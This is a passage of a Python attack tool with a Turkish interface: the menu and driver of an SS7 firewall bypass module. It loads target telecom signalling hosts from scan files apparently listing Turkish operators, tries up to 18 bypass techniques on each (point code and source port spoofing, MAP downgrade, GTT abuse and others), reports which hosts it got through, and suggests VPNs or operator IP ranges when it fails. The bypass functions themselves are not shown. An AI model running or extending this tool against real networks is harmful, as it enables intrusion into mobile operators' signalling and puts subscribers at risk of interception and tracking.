                print(f"  \033[33m  => {len(successes)} potansiyel bypass\033[0m")
            else:
                print(f"  \033[90m  => Tum teknikler basarisiz\033[0m")
    
    return all_results


# ============================================
# STANDALONE MENU
# ============================================

def _load_targets_auto():
    """Load targets automatically from scan result files."""
    import re
    
    target_files = [
        'turkey_verified.txt',
        'turkey_ss7_results.txt',
        'leaks_ss7.txt',
    ]
    
    targets = []
    seen_ips = set()
    
    for fname in target_files:
        if not os.path.exists(fname):
            continue
        try:
            with open(fname, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Extract IP:PORT pairs
            for line in content.splitlines():
                # Pattern: IP:PORT or just IP
                match = re.search(r'(\d+\.\d+\.\d+\.\d+):?(\d+)?', line)
                if match:
                    ip = match.group(1)
                    port = int(match.group(2)) if match.group(2) else 2905
                    
                    # Only SS7 ports
                    if port in (2904, 2905, 2906, 14001, 3565, 7626):
                        if ip not in seen_ips:
                            seen_ips.add(ip)
                            targets.append((ip, port))
            
            if targets:
                print(f"  \033[32m[+] {fname}: {len(targets)} hedef yuklendi\033[0m")
                break  # Found targets, stop looking
        except Exception as e:
            print(f"  [-] {fname} okunamadi: {e}")
    
    return targets


def bypass_menu():
    """Interactive firewall bypass menu."""
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print("=" * 60)
    print(" SS7 Firewall Bypass Modulu")
    print(" 18 farkli teknik ile firewall atlatma")
    print("=" * 60)
    print()
    print("Teknikler:")
    print("  \033[31m 1) SCTP Native        Gercek SCTP baglanti (EN ETKILI)\033[0m")
    print("  \033[31m 2) Source Port Spoof   SIGTRAN kaynak port ile whitelist bypass\033[0m")
    print("  \033[31m 3) SCTP Multi-Homing   IP rotasyon ile bypass\033[0m")
    print("   4) Direkt SCCP        Handshake atlayip direkt MAP gonder")
    print("   5) M3UA Fragmentasyon  DPI bypass")
    print("   6) M3UA Params         ASP ID/Info String manipulasyonu")
    print("   7) M2PA Protokolu      Alternatif SIGTRAN")
    print("   8) Heartbeat Probe     Session bypass")
    print("   9) Versiyon Fuzzing    M3UA v0/v2/v3")
    print("  10) SUA Protokolu       SCCP User Adaptation")
    print("  11) SCTP-over-TCP       SCTP frame TCP icinde")
    print("  12) Routing Context     RC manipulasyonu")
    print("  13) SCCP GTT            Global Title Translation abuse")
    print("  14) MAP Downgrade       MAP v3->v2->v1 downgrade")
    print("  15) TCAP DID            Dialogue ID prediction")
    print("  16) PC Advanced         Point code spoofing")
    print("  17) Hop Counter        SCCP hop manipulasyonu")
    print("  18) Diameter Origin    Origin-Host/Realm rotation")
    print("  19) Coklu Port Tara     Tum SIGTRAN portlari")
    print("  \033[32m 20) HEPSINI DENE        Tam bypass testi (onerilen)\033[0m")
    print()
    
    # Auto-load or manual
    print("Hedef Secimi:")
    print("  1) Otomatik (dosyalardan yukle)")
    print("  2) Manuel IP girisi")
    target_mode = get_input("Secim", "1")
    
    targets = []
    
    if target_mode == "1":
        targets = _load_targets_auto()
        if not targets:
            print("\n  [-] Dosyalarda hedef bulunamadi. Manuel giris:")
            target_mode = "2"
    
    if target_mode == "2":
        target = get_input("Hedef IP", "")
        if not target or not _is_valid_ip(target):
            print("[-] Gecersiz IP adresi.")
            return
        port = _prompt_int("Port", 2905, min_value=1, max_value=65535)
        targets = [(target, port)]
    
    if not targets:
        print("[-] Hedef yok, cikiliyor.")
        input("\nDevam etmek icin Enter'a basin...")
        return
    
    # Show loaded targets
    print(f"\n  [+] Toplam {len(targets)} hedef yuklendi")
    
    # Limit selection
    if len(targets) > 10:
        limit = _prompt_int("Kac hedef test edilsin?", 10, min_value=1, max_value=len(targets))
        targets = targets[:limit]
        print(f"  [+] Ilk {len(targets)} hedef secildi")
    
    for i, (ip, port) in enumerate(targets[:5]):
        print(f"      {i+1}. {ip}:{port}")
    if len(targets) > 5:
        print(f"      ... ve {len(targets)-5} hedef daha")
    
    timeout = _prompt_int("\nTimeout", 3, min_value=1, max_value=30)
    
    choice = get_input("Teknik", "12")
    
    technique_map = {
        '1': ('SCTP Native', bypass_native_sctp),
        '2': ('Source Port', bypass_source_port),
        '3': ('SCTP Multi-Homing', bypass_sctp_multihoming),
        '4': ('Direct SCCP', bypass_direct_sccp),
        '5': ('Fragmentasyon', bypass_fragmentation),
        '6': ('M3UA Params', bypass_m3ua_params),
        '7': ('M2PA', bypass_m2pa),
        '8': ('Heartbeat', bypass_heartbeat),
        '9': ('Version Fuzz', bypass_version_fuzz),
        '10': ('SUA', bypass_sua),
        '11': ('SCTP Frame', bypass_sctp_frame),
        '12': ('Routing Context', bypass_routing_context),
        '13': ('SCCP GTT', bypass_sccp_gtt),
        '14': ('MAP Downgrade', bypass_map_downgrade),
        '15': ('TCAP DID', bypass_tcap_did),
        '16': ('PC Advanced', bypass_pc_advanced),
        '17': ('Hop Counter', bypass_sccp_hop_counter),
        '18': ('Diameter Origin', bypass_diameter_origin),
        '19': ('Multi-port', bypass_multiport),
    }
    
    # Run on all targets
    all_target_results = {}
    total_criticals = 0
    total_successes = 0
    
    for idx, (ip, port) in enumerate(targets):
        print(f"\n{'='*60}")
        print(f" [{idx+1}/{len(targets)}] Hedef: {ip}:{port}")
        print(f"{'='*60}\n")
        
        results = []
        
        if choice == '20':
            results = run_all_bypasses(ip, port, timeout, verbose=True)
        elif choice == '19':
            results = bypass_multiport(ip, timeout)
        elif choice in technique_map:
            name, func = technique_map[choice]
            print(f"  [{name}] test ediliyor...")
            results = func(ip, port, timeout)
        else:
            print(f"  [-] Gecersiz teknik secimi: {choice}")
            continue
        
        all_target_results[(ip, port)] = results
        
        successes = [r for r in results if r.get('success')]
        criticals = [r for r in successes if r.get('level') == 'CRITICAL']
        total_criticals += len(criticals)
        total_successes += len(successes)
        
        if criticals:
            print(f"\n  \033[31m[!!!] BYPASS BASARILI: {ip}:{port}\033[0m")
            for c in criticals:
                print(f"       {c['technique']}: {c['response']}")
        elif successes:
            print(f"\n  \033[33m[!] Potansiyel: {ip}:{port} ({len(successes)} teknik)\033[0m")
    
    # Overall Summary
    print(f"\n{'='*60}")
    print(" GENEL SONUC")
    print(f"{'='*60}")
    print(f"  Toplam hedef:      {len(targets)}")
    print(f"  Bypass basarili:   \033[32m{total_successes}\033[0m")
    print(f"  Kritik zafiyet:    \033[31m{total_criticals}\033[0m")
    
    if total_criticals > 0:
        print(f"\n  \033[31m[!!!] FIREWALL BYPASS BASARILI HEDEFLER:\033[0m")
        for (ip, port), results in all_target_results.items():
            crits = [r for r in results if r.get('success') and r.get('level') == 'CRITICAL']
            if crits:
                print(f"\n    {ip}:{port}")
                for c in crits:
                    print(f"       -> {c['technique']}: {c['response']}")
    elif total_successes > 0:
        print(f"\n  \033[33m[!] Potansiyel bypass noktalari olan hedefler:\033[0m")
        for (ip, port), results in all_target_results.items():
            succs = [r for r in results if r.get('success')]
            if succs:
                print(f"    {ip}:{port} - {len(succs)} potansiyel")
    else:
        print(f"\n  [-] Tum hedeflerde firewall teknikleri engelledi.")
        print(f"  [?] Oneriler:")
        print(f"      - Farkli kaynak IP deneyin (VPN/proxy)")
        print(f"      - SCTP destekli sunucu deneyin (pysctp)")
        print(f"      - Operator IP araliginda bir sunucu edinin")
    
    print(f"\n{'='*60}\n")
    
    # Save results
    report_file = f"bypass_report_{int(time.time())}.json"
    report_data = {
        'timestamp': datetime.datetime.now().isoformat(),
        'total_targets': len(targets),
        'total_successes': total_successes,
        'total_criticals': total_criticals,
        'targets': {}
    }
    for (ip, port), results in all_target_results.items():
        report_data['targets'][f"{ip}:{port}"] = results
    
    try:
        with open(report_file, 'w') as f:
            json.dump(report_data, f, indent=2, default=str)
        print(f"  [+] Rapor: {report_file}")
    except Exception as e:
        print(f"  [-] Rapor kaydedilemedi: {e}")
    
    input("\nDevam etmek icin Enter'a basin...")


if __name__ == '__main__':
    bypass_menu()
